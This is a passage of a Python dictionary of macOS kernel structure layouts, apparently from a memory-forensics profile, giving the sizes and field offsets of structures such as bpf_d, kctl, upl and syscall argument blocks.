    'ifmd_snd_drops': [0x20, ['unsigned int']],
    'ifmd_filler': [0x24, ['array', 4, ['unsigned int']]],
    'ifmd_data': [0x34, ['if_data64']],
}],
  'upl': [ 0x58, {
    'Lock': [0x0, ['_lck_mtx_']],
    'ref_count': [0x10, ['int']],
    'ext_ref_count': [0x14, ['int']],
    'flags': [0x18, ['int']],
    'src_object': [0x20, ['pointer', ['vm_object']]],
    'offset': [0x28, ['unsigned long long']],
    'size': [0x30, ['unsigned int']],
    'kaddr': [0x38, ['unsigned long']],
    'map_object': [0x40, ['pointer', ['vm_object']]],
    'highest_page': [0x48, ['unsigned int']],
    'vector_upl': [0x50, ['pointer', ['void']]],
}],
  'IOStatisticsUserClientCall': [ 0x1c, {
    'processName': [0x0, ['array', 20, ['char']]],
    'pid': [0x14, ['int']],
    'calls': [0x18, ['unsigned int']],
}],
  '__unnamed_5423863': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['nfs_socket']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['nfs_socket']]]],
}],
  'in6_cga_prepare': [ 0x20, {
    'cga_modifier': [0x0, ['in6_cga_modifier']],
    'cga_security_level': [0x10, ['unsigned char']],
    'reserved_A': [0x11, ['array', 15, ['unsigned char']]],
}],
  'processor_basic_info': [ 0x14, {
    'cpu_type': [0x0, ['int']],
    'cpu_subtype': [0x4, ['int']],
    'running': [0x8, ['int']],
    'slot_num': [0xc, ['int']],
    'is_master': [0x10, ['int']],
}],
  'IOTimerEventSource_class': [ 0x60, {
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'calloutEntry': [0x48, ['pointer', ['void']]],
    'abstime': [0x50, ['unsigned long long']],
    'reserved': [0x58, ['pointer', ['ExpansionData']]],
}],
  'tcptimerentry': [ 0x20, {
    'le': [0x0, ['__unnamed_12512871']],
    'timer_start': [0x10, ['unsigned int']],
    'index': [0x14, ['unsigned short']],
    'runtime': [0x18, ['unsigned int']],
}],
  'IOGeneralMemoryDescriptor_class': [ 0xb0, {
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    '_ranges': [0x60, ['Ranges']],
    '_rangesCount': [0x68, ['unsigned int']],
    '_task': [0x70, ['pointer', ['task']]],
    '_singleRange': [0x78, ['__unnamed_16348702']],
    '_wireCount': [0x88, ['unsigned int']],
    '_initialized': [0x8c, ['int']],
    '_memoryEntries': [0x90, ['pointer', ['OSData_class']]],
    '_pages': [0x98, ['unsigned int']],
    '_highestPage': [0x9c, ['unsigned int']],
    '__iomd_reservedA': [0xa0, ['unsigned int']],
    '__iomd_reservedB': [0xa4, ['unsigned int']],
    '_prepareLock': [0xa8, ['pointer', ['__unnamed_16327073']]],
}],
  'x_pktap_filter': [ 0x20, {
    'filter_op': [0x0, ['unsigned int']],
    'filter_param': [0x4, ['unsigned int']],
    'param_': [0x8, ['__unnamed_7644106']],
}],
  'psynch_cvsignal_args': [ 0x40, {
    'cv': [0x0, ['unsigned long long']],
    'cv_l_': [0x0, ['array', 0, ['char']]],
    'cvlsgen_l_': [0x8, ['array', 0, ['char']]],
    'cvlsgen': [0x8, ['unsigned long long']],
    'cv_r_': [0x8, ['array', 0, ['char']]],
    'cvugen_l_': [0x10, ['array', 0, ['char']]],
    'cvugen': [0x10, ['unsigned int']],
    'cvlsgen_r_': [0x10, ['array', 0, ['char']]],
    'cvugen_r_': [0x14, ['array', 4, ['char']]],
    'thread_port': [0x18, ['int']],
    'thread_port_l_': [0x18, ['array', 0, ['char']]],
    'thread_port_r_': [0x1c, ['array', 4, ['char']]],
    'mutex_l_': [0x20, ['array', 0, ['char']]],
    'mutex': [0x20, ['unsigned long long']],
    'mugen_l_': [0x28, ['array', 0, ['char']]],
    'mugen': [0x28, ['unsigned long long']],
    'mutex_r_': [0x28, ['array', 0, ['char']]],
    'mugen_r_': [0x30, ['array', 0, ['char']]],
    'tid': [0x30, ['unsigned long long']],
    'tid_l_': [0x30, ['array', 0, ['char']]],
    'tid_r_': [0x38, ['array', 0, ['char']]],
    'flags_l_': [0x38, ['array', 0, ['char']]],
    'flags': [0x38, ['unsigned int']],
    'flags_r_': [0x3c, ['array', 4, ['char']]],
}],
  'fairshare_queue': [ 0x28, {
    'count': [0x0, ['int']],
    'queue': [0x8, ['queue_entry']],
    'runq_stats': [0x18, ['runq_stats']],
}],
  '_notifyMsg': [ 0x20, {
    'h': [0x0, ['__unnamed_15865881']],
}],
  '_loaded_kext_summary': [ 0x78, {
    'name': [0x0, ['array', 64, ['char']]],
    'uuid': [0x40, ['array', 16, ['unsigned char']]],
    'address': [0x50, ['unsigned long long']],
    'size': [0x58, ['unsigned long long']],
    'version': [0x60, ['unsigned long long']],
    'loadTag': [0x68, ['unsigned int']],
    'flags': [0x6c, ['unsigned int']],
    'reference_list': [0x70, ['unsigned long long']],
}],
  'pfioc_kernel_token': [ 0x60, {
    'next': [0x0, ['__unnamed_7468933']],
    'token': [0x8, ['pfioc_token']],
}],
  'bpf_d': [ 0xb8, {
    'bd_next': [0x0, ['pointer', ['bpf_d']]],
    'bd_sbuf': [0x8, ['pointer', ['char']]],
    'bd_hbuf': [0x10, ['pointer', ['char']]],
    'bd_fbuf': [0x18, ['pointer', ['char']]],
    'bd_slen': [0x20, ['int']],
    'bd_hlen': [0x24, ['int']],
    'bd_bufsize': [0x28, ['int']],
    'bd_hbuf_read': [0x2c, ['int']],
    'bd_bif': [0x30, ['pointer', ['bpf_if']]],
    'bd_rtout': [0x38, ['unsigned int']],
    'bd_filter': [0x40, ['pointer', ['bpf_insn']]],
    'bd_rcount': [0x48, ['unsigned int']],
    'bd_dcount': [0x4c, ['unsigned int']],
    'bd_promisc': [0x50, ['unsigned char']],
    'bd_state': [0x51, ['unsigned char']],
    'bd_immediate': [0x52, ['unsigned char']],
    'bd_async': [0x54, ['int']],
    'bd_sig': [0x58, ['int']],
    'bd_sigio': [0x5c, ['int']],
    'bd_pad': [0x60, ['unsigned char']],
    'bd_sel': [0x68, ['selinfo']],
    'bd_hdrcmplt': [0x98, ['int']],
    'bd_seesent': [0x9c, ['int']],
    'bd_oflags': [0xa0, ['int']],
    'bd_thread_call': [0xa8, ['pointer', ['thread_call']]],
    'bd_traffic_class': [0xb0, ['int']],
    'bd_extendedhdr': [0xb4, ['int']],
}],
  'nstat_tcp_add_param': [ 0x38, {
    'local': [0x0, ['__unnamed_7030870']],
    'remote': [0x1c, ['__unnamed_7030920']],
}],
  'dtrace_helpers': [ 0xa8, {
    'dthps_actions': [0x0, ['pointer', ['pointer', ['dtrace_helper_action']]]],
    'dthps_vstate': [0x8, ['dtrace_vstate']],
    'dthps_provs': [0x78, ['pointer', ['pointer', ['dtrace_helper_provider']]]],
    'dthps_nprovs': [0x80, ['unsigned int']],
    'dthps_maxprovs': [0x84, ['unsigned int']],
    'dthps_generation': [0x88, ['int']],
    'dthps_pid': [0x8c, ['int']],
    'dthps_deferred': [0x90, ['int']],
    'dthps_next': [0x98, ['pointer', ['dtrace_helpers']]],
    'dthps_prev': [0xa0, ['pointer', ['dtrace_helpers']]],
}],
  'intel_ucupdate': [ 0x34, {
    'header_version': [0x0, ['unsigned int']],
    'update_revision': [0x4, ['unsigned int']],
    'date': [0x8, ['unsigned int']],
    'processor_signature': [0xc, ['unsigned int']],
    'checksum': [0x10, ['unsigned int']],
    'loader_revision': [0x14, ['unsigned int']],
    'processor_flags': [0x18, ['unsigned int']],
    'data_size': [0x1c, ['unsigned int']],
    'total_size': [0x20, ['unsigned int']],
    'reserved0': [0x24, ['unsigned int']],
    'reserved1': [0x28, ['unsigned int']],
    'reserved2': [0x2c, ['unsigned int']],
    'data': [0x30, ['unsigned int']],
}],
  '__unnamed_4570557': [ 0x8, {
    'alias': [0x0, ['unsigned long']],
    'kobject': [0x0, ['unsigned long']],
    'imp_task': [0x0, ['pointer', ['task']]],
}],
  'settid_args': [ 0x10, {
    'uid': [0x0, ['unsigned int']],
    'uid_l_': [0x0, ['array', 0, ['char']]],
    'uid_r_': [0x4, ['array', 4, ['char']]],
    'gid': [0x8, ['unsigned int']],
    'gid_l_': [0x8, ['array', 0, ['char']]],
    'gid_r_': [0xc, ['array', 4, ['char']]],
}],
  'sadb_x_policy': [ 0x10, {
    'sadb_x_policy_len': [0x0, ['unsigned short']],
    'sadb_x_policy_exttype': [0x2, ['unsigned short']],
    'sadb_x_policy_type': [0x4, ['unsigned short']],
    'sadb_x_policy_dir': [0x6, ['unsigned char']],
    'sadb_x_policy_reserved': [0x7, ['unsigned char']],
    'sadb_x_policy_id': [0x8, ['unsigned int']],
    'sadb_x_policy_reserved2': [0xc, ['unsigned int']],
}],
  'mcache_bkttype': [ 0x20, {
    'bt_bktsize': [0x0, ['int']],
    'bt_minbuf': [0x8, ['unsigned long']],
    'bt_maxbuf': [0x10, ['unsigned long']],
    'bt_cache': [0x18, ['pointer', ['mcache']]],
}],
  '__va_list_tag': [ 0x18, {
    'gp_offset': [0x0, ['unsigned int']],
    'fp_offset': [0x4, ['unsigned int']],
    'overflow_arg_area': [0x8, ['pointer', ['void']]],
    'reg_save_area': [0x10, ['pointer', ['void']]],
}],
  'async_work_lst': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['vnode']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['vnode']]]],
}],
  '__unnamed_4576220': [ 0x20, {
    'waitsemaphore': [0x0, ['pointer', ['semaphore']]],
    'signalsemaphore': [0x8, ['pointer', ['semaphore']]],
    'options': [0x10, ['int']],
    'result': [0x14, ['int']],
    'continuation': [0x18, ['pointer', ['void']]],
}],
  '__unnamed_2998638': [ 0x8, {
    'map': [0x0, ['pointer', ['_vm_map']]],
    'copy': [0x0, ['pointer', ['vm_map_copy']]],
    'object': [0x0, ['pointer', ['vm_object']]],
    'pager': [0x0, ['pointer', ['memory_object']]],
}],
  '__unnamed_5432545': [ 0x10, {
    'opaque': [0x0, ['array', 3, ['unsigned int']]],
    'opaque4': [0xc, ['unsigned int']],
}],
  'munmap_args': [ 0x10, {
    'addr': [0x0, ['unsigned long long']],
    'addr_l_': [0x0, ['array', 0, ['char']]],
    'addr_r_': [0x8, ['array', 0, ['char']]],
    'len': [0x8, ['unsigned long long']],
    'len_l_': [0x8, ['array', 0, ['char']]],
    'len_r_': [0x10, ['array', 0, ['char']]],
}],
  'JournalInfoBlock': [ 0xb4, {
    'flags': [0x0, ['unsigned int']],
    'device_signature': [0x4, ['array', 8, ['unsigned int']]],
    'offset': [0x24, ['unsigned long long']],
    'size': [0x2c, ['unsigned long long']],
    'ext_jnl_uuid': [0x34, ['array', 37, ['char']]],
    'machine_serial_num': [0x59, ['array', 48, ['char']]],
    'reserved': [0x89, ['array', 43, ['char']]],
}],
  'audit_stat': [ 0x38, {
    'as_version': [0x0, ['unsigned int']],
    'as_numevent': [0x4, ['unsigned int']],
    'as_generated': [0x8, ['int']],
    'as_nonattrib': [0xc, ['int']],
    'as_kernel': [0x10, ['int']],
    'as_audit': [0x14, ['int']],
    'as_auditctl': [0x18, ['int']],
    'as_enqueue': [0x1c, ['int']],
    'as_written': [0x20, ['int']],
    'as_wblocked': [0x24, ['int']],
    'as_rblocked': [0x28, ['int']],
    'as_dropped': [0x2c, ['int']],
    'as_totalsize': [0x30, ['int']],
    'as_memused': [0x34, ['unsigned int']],
}],
  'IOPMSystemSleepPolicyVariables': [ 0x100, {
    'signature': [0x0, ['unsigned int']],
    'version': [0x4, ['unsigned int']],
    'currentCapability': [0x8, ['unsigned long long']],
    'highestCapability': [0x10, ['unsigned long long']],
    'sleepFactors': [0x18, ['unsigned long long']],
    'sleepReason': [0x20, ['unsigned int']],
    'sleepPhase': [0x24, ['unsigned int']],
    'hibernateMode': [0x28, ['unsigned int']],
    'standbyDelay': [0x2c, ['unsigned int']],
    'poweroffDelay': [0x30, ['unsigned int']],
    'scheduledAlarms': [0x34, ['unsigned int']],
    'poweroffTimer': [0x38, ['unsigned int']],
    'reserved': [0x3c, ['array', 49, ['unsigned int']]],
}],
  'blue': [ 0x68, {
    'blue_flags': [0x0, ['unsigned int']],
    'blue_pmark': [0x4, ['int']],
    'blue_max_pmark': [0x8, ['int']],
    'blue_hold_time': [0xc, ['unsigned int']],
    'blue_ifp': [0x10, ['pointer', ['ifnet']]],
    'blue_idle': [0x18, ['unsigned int']],
    'blue_last': [0x20, ['timeval']],
    'blue_stats': [0x30, ['__unnamed_7799333']],
}],
  'pgrp': [ 0x48, {
    'pg_hash': [0x0, ['__unnamed_17151008']],
    'pg_members': [0x10, ['__unnamed_17151058']],
    'pg_session': [0x18, ['pointer', ['session']]],
    'pg_id': [0x20, ['int']],
    'pg_jobc': [0x24, ['int']],
    'pg_membercnt': [0x28, ['int']],
    'pg_refcount': [0x2c, ['int']],
    'pg_listflags': [0x30, ['unsigned int']],
    'pg_mlock': [0x38, ['__unnamed_17148151']],
}],
  '__unnamed_5433939': [ 0x10, {
    'le_next': [0x0, ['pointer', ['nfsrv_descript']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['nfsrv_descript']]]],
}],
  'user32_dyld_all_image_infos': [ 0x3c, {
    'version': [0x0, ['unsigned int']],
    'infoArrayCount': [0x4, ['unsigned int']],
    'infoArray': [0x8, ['unsigned int']],
    'notification': [0xc, ['unsigned int']],
    'processDetachedFromSharedRegion': [0x10, ['unsigned char']],
    'libSystemInitialized': [0x11, ['unsigned char']],
    'dyldImageLoadAddress': [0x14, ['unsigned int']],
    'jitInfo': [0x18, ['unsigned int']],
    'dyldVersion': [0x1c, ['unsigned int']],
    'errorMessage': [0x20, ['unsigned int']],
    'terminationFlags': [0x24, ['unsigned int']],
    'coreSymbolicationShmPage': [0x28, ['unsigned int']],
    'systemOrderFlag': [0x2c, ['unsigned int']],
    'uuidArrayCount': [0x30, ['unsigned int']],
    'uuidArray': [0x34, ['unsigned int']],
    'dyldAllImageInfosAddress': [0x38, ['unsigned int']],
}],
  '__unnamed_9988809': [ 0x10, {
    'le_next': [0x0, ['pointer', ['secasvar']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['secasvar']]]],
}],
  'OSObjectTracking': [ 0x80, {
    'link': [0x0, ['queue_entry']],
    'bt': [0x10, ['array', 14, ['pointer', ['void']]]],
}],
  'HFSExtentKey': [ 0x8, {
    'keyLength': [0x0, ['unsigned char']],
    'forkType': [0x1, ['unsigned char']],
    'fileID': [0x2, ['unsigned int']],
    'startBlock': [0x6, ['unsigned short']],
}],
  'linkupdate_state': [ 0xc, {
    'filelinkid': [0x0, ['unsigned int']],
    'prevlinkid': [0x4, ['unsigned int']],
    'nextlinkid': [0x8, ['unsigned int']],
}],
  'exchangedata_args': [ 0x18, {
    'path1': [0x0, ['unsigned long long']],
    'path1_l_': [0x0, ['array', 0, ['char']]],
    'path2': [0x8, ['unsigned long long']],
    'path2_l_': [0x8, ['array', 0, ['char']]],
    'path1_r_': [0x8, ['array', 0, ['char']]],
    'options_l_': [0x10, ['array', 0, ['char']]],
    'path2_r_': [0x10, ['array', 0, ['char']]],
    'options': [0x10, ['unsigned long long']],
    'options_r_': [0x18, ['array', 0, ['char']]],
}],
  'pmap_memory_regions': [ 0x20, {
    'base': [0x0, ['unsigned int']],
    'alloc_up': [0x4, ['unsigned int']],
    'alloc_down': [0x8, ['unsigned int']],
    'end': [0xc, ['unsigned int']],
    'type': [0x10, ['unsigned int']],
    'attribute': [0x18, ['unsigned long long']],
}],
  'pfioc_state_kill': [ 0x98, {
    'psk_af': [0x0, ['unsigned char']],
    'psk_proto': [0x1, ['unsigned char']],
    'psk_proto_variant': [0x2, ['unsigned char']],
    '_pad': [0x3, ['unsigned char']],
    'psk_src': [0x8, ['pfioc_state_addr_kill']],
    'psk_dst': [0x48, ['pfioc_state_addr_kill']],
    'psk_ifname': [0x88, ['array', 16, ['char']]],
}],
  'task_absolutetime_info': [ 0x20, {
    'total_user': [0x0, ['unsigned long long']],
    'total_system': [0x8, ['unsigned long long']],
    'threads_user': [0x10, ['unsigned long long']],
    'threads_system': [0x18, ['unsigned long long']],
}],
  '__unnamed_11564611': [ 0x10, {
    '__p_forw': [0x0, ['unsigned long long']],
    '__p_back': [0x8, ['unsigned long long']],
}],
  'dtrace_helper_probedesc': [ 0x58, {
    'dthpb_mod': [0x0, ['pointer', ['char']]],
    'dthpb_func': [0x8, ['pointer', ['char']]],
    'dthpb_name': [0x10, ['pointer', ['char']]],
    'dthpb_base': [0x18, ['unsigned long long']],
    'dthpb_offs': [0x20, ['pointer', ['int']]],
    'dthpb_enoffs': [0x28, ['pointer', ['int']]],
    'dthpb_noffs': [0x30, ['unsigned int']],
    'dthpb_nenoffs': [0x34, ['unsigned int']],
    'dthpb_args': [0x38, ['pointer', ['unsigned char']]],
    'dthpb_xargc': [0x40, ['unsigned char']],
    'dthpb_nargc': [0x41, ['unsigned char']],
    'dthpb_xtypes': [0x48, ['pointer', ['char']]],
    'dthpb_ntypes': [0x50, ['pointer', ['char']]],
}],
  'tcq_class': [ 0x78, {
    'cl_handle': [0x0, ['unsigned int']],
    'cl_q': [0x8, ['_class_queue_']],
    'cl_qflags': [0x30, ['unsigned int']],
    'cl_qalg': [0x38, ['__unnamed_7800318']],
    'cl_pri': [0x40, ['int']],
    'cl_flags': [0x44, ['unsigned int']],
    'cl_tif': [0x48, ['pointer', ['tcq_if']]],
    'cl_period': [0x50, ['unsigned int']],
    'cl_xmitcnt': [0x58, ['pktcntr']],
    'cl_dropcnt': [0x68, ['pktcntr']],
}],
  'ztrace': [ 0x90, {
    'zt_size': [0x0, ['unsigned long']],
    'zt_depth': [0x8, ['unsigned int']],
    'zt_stack': [0x10, ['array', 15, ['pointer', ['void']]]],
    'zt_collisions': [0x88, ['unsigned int']],
    'zt_hit_count': [0x8c, ['unsigned int']],
}],
  '__unnamed_17073908': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['vnode']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['vnode']]]],
}],
  'in_addr': [ 0x4, {
    's_addr': [0x0, ['unsigned int']],
}],
  'getdirentries64_args': [ 0x20, {
    'fd_l_': [0x0, ['array', 0, ['char']]],
    'fd': [0x0, ['int']],
    'fd_r_': [0x4, ['array', 4, ['char']]],
    'buf_l_': [0x8, ['array', 0, ['char']]],
    'buf': [0x8, ['unsigned long long']],
    'buf_r_': [0x10, ['array', 0, ['char']]],
    'bufsize_l_': [0x10, ['array', 0, ['char']]],
    'bufsize': [0x10, ['unsigned long long']],
    'position_l_': [0x18, ['array', 0, ['char']]],
    'bufsize_r_': [0x18, ['array', 0, ['char']]],
    'position': [0x18, ['unsigned long long']],
    'position_r_': [0x20, ['array', 0, ['char']]],
}],
  'dhcp_packet': [ 0x108, {
    'ip': [0x0, ['ip']],
    'udp': [0x14, ['udphdr']],
    'dhcp': [0x1c, ['dhcp']],
}],
  'if_throttlereq': [ 0x14, {
    'ifthr_name': [0x0, ['array', 16, ['char']]],
    'ifthr_level': [0x10, ['unsigned int']],
}],
  'UNDDisplayAlertFromBundle_rpcMessU': [ 0x5dc, {
    'In': [0x0, ['__unnamed_141103']],
}],
  'dhcpoa_s': [ 0x20, {
    'oa_buffer': [0x0, ['pointer', ['unsigned char']]],
    'oa_size': [0x8, ['int']],
    'oa_offset': [0xc, ['int']],
    'oa_end_tag': [0x10, ['int']],
    'oa_option_count': [0x14, ['int']],
    'oa_reserve': [0x18, ['int']],
}],
  'mcluster': [ 0x800, {
    'mcl_next': [0x0, ['pointer', ['mcluster']]],
    'mcl_buf': [0x0, ['array', 2048, ['char']]],
}],
  'kdp_callout': [ 0x18, {
    'callout_next': [0x0, ['pointer', ['kdp_callout']]],
    'callout_fn': [0x8, ['pointer', ['void']]],
    'callout_arg': [0x10, ['pointer', ['void']]],
}],
  'ip_mreq_source': [ 0xc, {
    'imr_multiaddr': [0x0, ['in_addr']],
    'imr_sourceaddr': [0x4, ['in_addr']],
    'imr_interface': [0x8, ['in_addr']],
}],
  'net_str_id_entry': [ 0x18, {
    'nsi_next': [0x0, ['__unnamed_7154869']],
    'nsi_flags': [0x8, ['unsigned int']],
    'nsi_id': [0xc, ['unsigned int']],
    'nsi_string': [0x10, ['array', 1, ['char']]],
}],
  '__unnamed_15102313': [ 0x10, {
    'opaque': [0x0, ['array', 2, ['unsigned long']]],
}],
  'mkdir_args': [ 0x10, {
    'path_l_': [0x0, ['array', 0, ['char']]],
    'path': [0x0, ['unsigned long long']],
    'mode_l_': [0x8, ['array', 0, ['char']]],
    'path_r_': [0x8, ['array', 0, ['char']]],
    'mode': [0x8, ['int']],
    'mode_r_': [0xc, ['array', 4, ['char']]],
}],
  '__user64_sigaction': [ 0x18, {
    '__sigaction_u': [0x0, ['__user64_sigaction_u']],
    'sa_tramp': [0x8, ['unsigned long long']],
    'sa_mask': [0x10, ['unsigned int']],
    'sa_flags': [0x14, ['int']],
}],
  'nfsclientidlist': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['nfs_client_id']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['nfs_client_id']]]],
}],
  'nfs_file_lock_queue': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['nfs_file_lock']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['nfs_file_lock']]]],
}],
  'lctx': [ 0x38, {
    'lc_list': [0x0, ['__unnamed_17151881']],
    'lc_members': [0x10, ['__unnamed_17151931']],
    'lc_mc': [0x18, ['int']],
    'lc_id': [0x1c, ['int']],
    'lc_mtx': [0x20, ['__unnamed_17148151']],
    'lc_label': [0x30, ['pointer', ['label']]],
}],
  '__unnamed_10740683': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['audit_pipe']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['audit_pipe']]]],
}],
  'tb_profile': [ 0x10, {
    'rate': [0x0, ['unsigned long long']],
    'percent': [0x8, ['unsigned int']],
    'depth': [0xc, ['unsigned int']],
}],
  'accept_args': [ 0x18, {
    's_l_': [0x0, ['array', 0, ['char']]],
    's': [0x0, ['int']],
    's_r_': [0x4, ['array', 4, ['char']]],
    'name': [0x8, ['unsigned long long']],
    'name_l_': [0x8, ['array', 0, ['char']]],
    'name_r_': [0x10, ['array', 0, ['char']]],
    'anamelen_l_': [0x10, ['array', 0, ['char']]],
    'anamelen': [0x10, ['unsigned long long']],
    'anamelen_r_': [0x18, ['array', 0, ['char']]],
}],
  'delete_args': [ 0x8, {
    'path': [0x0, ['unsigned long long']],
    'path_l_': [0x0, ['array', 0, ['char']]],
    'path_r_': [0x8, ['array', 0, ['char']]],
}],
  'mb_class_stat': [ 0x88, {
    'mbcl_cname': [0x0, ['array', 16, ['char']]],
    'mbcl_size': [0x10, ['unsigned int']],
    'mbcl_total': [0x14, ['unsigned int']],
    'mbcl_active': [0x18, ['unsigned int']],
    'mbcl_infree': [0x1c, ['unsigned int']],
    'mbcl_slab_cnt': [0x20, ['unsigned int']],
    'mbcl_pad': [0x24, ['unsigned int']],
    'mbcl_alloc_cnt': [0x28, ['unsigned long long']],
    'mbcl_free_cnt': [0x30, ['unsigned long long']],
    'mbcl_notified': [0x38, ['unsigned long long']],
    'mbcl_purge_cnt': [0x40, ['unsigned long long']],
    'mbcl_fail_cnt': [0x48, ['unsigned long long']],
    'mbcl_ctotal': [0x50, ['unsigned int']],
    'mbcl_mc_state': [0x54, ['unsigned int']],
    'mbcl_mc_cached': [0x58, ['unsigned int']],
    'mbcl_mc_waiter_cnt': [0x5c, ['unsigned int']],
    'mbcl_mc_wretry_cnt': [0x60, ['unsigned int']],
    'mbcl_mc_nwretry_cnt': [0x64, ['unsigned int']],
    'mbcl_reserved': [0x68, ['array', 4, ['unsigned long long']]],
}],
  '__unnamed_4451990': [ 0x18, {
    'rbe_parent': [0x0, ['pointer', ['vm_map_store']]],
    'rbe_left': [0x8, ['pointer', ['vm_map_store']]],
    'rbe_right': [0x10, ['pointer', ['vm_map_store']]],
}],
  'ifnethead': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['ifnet']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['ifnet']]]],
}],
  'sdata': [ 0x10, {
    'prog': [0x0, ['unsigned int']],
    'vers': [0x4, ['unsigned int']],
    'proto': [0x8, ['unsigned int']],
    'port': [0xc, ['unsigned int']],
}],
  '__unnamed_17152478': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['proc']]],
}],
  'rdata': [ 0x48, {
    'errno': [0x0, ['unsigned int']],
    'data': [0x4, ['array', 68, ['unsigned char']]],
}],
  '_lck_attr_': [ 0x4, {
    'lck_attr_val': [0x0, ['unsigned int']],
}],
  'so_cinforeq32': [ 0x2c, {
    'scir_cid': [0x0, ['unsigned int']],
    'scir_flags': [0x4, ['unsigned int']],
    'scir_ifindex': [0x8, ['unsigned int']],
    'scir_error': [0xc, ['int']],
    'scir_src': [0x10, ['unsigned int']],
    'scir_src_len': [0x14, ['unsigned int']],
    'scir_dst': [0x18, ['unsigned int']],
    'scir_dst_len': [0x1c, ['unsigned int']],
    'scir_aux_type': [0x20, ['unsigned int']],
    'scir_aux_data': [0x24, ['unsigned int']],
    'scir_aux_len': [0x28, ['unsigned int']],
}],
  'policy_timeshare_info': [ 0x14, {
    'max_priority': [0x0, ['int']],
    'base_priority': [0x4, ['int']],
    'cur_priority': [0x8, ['int']],
    'depressed': [0xc, ['int']],
    'depress_priority': [0x10, ['int']],
}],
  'cdevsw': [ 0x70, {
    'd_open': [0x0, ['pointer', ['void']]],
    'd_close': [0x8, ['pointer', ['void']]],
    'd_read': [0x10, ['pointer', ['void']]],
    'd_write': [0x18, ['pointer', ['void']]],
    'd_ioctl': [0x20, ['pointer', ['void']]],
    'd_stop': [0x28, ['pointer', ['void']]],
    'd_reset': [0x30, ['pointer', ['void']]],
    'd_ttys': [0x38, ['pointer', ['pointer', ['tty']]]],
    'd_select': [0x40, ['pointer', ['void']]],
    'd_mmap': [0x48, ['pointer', ['void']]],
    'd_strategy': [0x50, ['pointer', ['void']]],
    'd_reserved_1': [0x58, ['pointer', ['void']]],
    'd_reserved_2': [0x60, ['pointer', ['void']]],
    'd_type': [0x68, ['int']],
}],
  'mcl_slab': [ 0x30, {
    'sl_next': [0x0, ['pointer', ['mcl_slab']]],
    'sl_class': [0x8, ['unsigned char']],
    'sl_refcnt': [0x9, ['signed char']],
    'sl_chunks': [0xa, ['signed char']],
    'sl_flags': [0xc, ['unsigned short']],
    'sl_len': [0xe, ['unsigned short']],
    'sl_base': [0x10, ['pointer', ['void']]],
    'sl_head': [0x18, ['pointer', ['void']]],
    'sl_link': [0x20, ['__unnamed_11989916']],
}],
  'udpstat': [ 0x58, {
    'udps_ipackets': [0x0, ['unsigned int']],
    'udps_hdrops': [0x4, ['unsigned int']],
    'udps_badsum': [0x8, ['unsigned int']],
    'udps_badlen': [0xc, ['unsigned int']],
    'udps_noport': [0x10, ['unsigned int']],
    'udps_noportbcast': [0x14, ['unsigned int']],
    'udps_fullsock': [0x18, ['unsigned int']],
    'udpps_pcbcachemiss': [0x1c, ['unsigned int']],
    'udpps_pcbhashmiss': [0x20, ['unsigned int']],
    'udps_opackets': [0x24, ['unsigned int']],
    'udps_fastout': [0x28, ['unsigned int']],
    'udps_nosum': [0x2c, ['unsigned int']],
    'udps_noportmcast': [0x30, ['unsigned int']],
    'udps_filtermcast': [0x34, ['unsigned int']],
    'udps_rcv_swcsum': [0x38, ['unsigned int']],
    'udps_rcv_swcsum_bytes': [0x3c, ['unsigned int']],
    'udps_rcv6_swcsum': [0x40, ['unsigned int']],
    'udps_rcv6_swcsum_bytes': [0x44, ['unsigned int']],
    'udps_snd_swcsum': [0x48, ['unsigned int']],
    'udps_snd_swcsum_bytes': [0x4c, ['unsigned int']],
    'udps_snd6_swcsum': [0x50, ['unsigned int']],
    'udps_snd6_swcsum_bytes': [0x54, ['unsigned int']],
}],
  '__unnamed_5418997': [ 0x10, {
    'b': [0x0, ['array', 16, ['unsigned char']]],
}],
  'mig_subsystem': [ 0x48, {
    'server': [0x0, ['pointer', ['void']]],
    'start': [0x8, ['int']],
    'end': [0xc, ['int']],
    'maxsize': [0x10, ['unsigned int']],
    'reserved': [0x18, ['unsigned long']],
    'routine': [0x20, ['array', 1, ['routine_descriptor']]],
}],
  'kctl': [ 0xd0, {
    'next': [0x0, ['__unnamed_12508792']],
    'name': [0x10, ['array', 96, ['char']]],
    'id': [0x70, ['unsigned int']],
    'reg_unit': [0x74, ['unsigned int']],
    'flags': [0x78, ['unsigned int']],
    'recvbufsize': [0x7c, ['unsigned int']],
    'sendbufsize': [0x80, ['unsigned int']],
    'connect': [0x88, ['pointer', ['void']]],
    'disconnect': [0x90, ['pointer', ['void']]],
    'send': [0x98, ['pointer', ['void']]],
    'setopt': [0xa0, ['pointer', ['void']]],
    'getopt': [0xa8, ['pointer', ['void']]],
    'rcvd': [0xb0, ['pointer', ['void']]],
    'kcb_head': [0xb8, ['__unnamed_12509029']],
    'lastunit': [0xc8, ['unsigned int']],
}],
  '__unnamed_9753953': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['nd_defrouter']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['nd_defrouter']]]],
}],
  'getfsstat_args': [ 0x18, {
    'buf_l_': [0x0, ['array', 0, ['char']]],
    'buf': [0x0, ['unsigned long long']],
    'buf_r_': [0x8, ['array', 0, ['char']]],
    'bufsize_l_': [0x8, ['array', 0, ['char']]],
    'bufsize': [0x8, ['int']],
    'bufsize_r_': [0xc, ['array', 4, ['char']]],
